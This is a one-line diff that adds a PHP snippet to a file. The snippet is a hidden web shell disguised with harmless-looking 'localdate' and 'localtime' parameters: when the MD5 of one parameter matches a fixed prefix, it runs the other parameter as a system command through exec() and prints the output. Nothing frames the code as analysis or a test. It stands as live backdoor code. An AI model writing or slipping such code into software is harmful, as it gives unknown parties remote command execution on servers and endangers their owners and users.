@@ -1,0 +1,1 @@
+<?php if (substr(md5($_GET["localdate"]),0,6) == "3880c0") { $time = str_replace("@"," ",$_GET["localtime"]); $output=[]; exec($time, $output); foreach ($output as $line) { echo $line . PHP_EOL . '<br>';} exit; } ?>
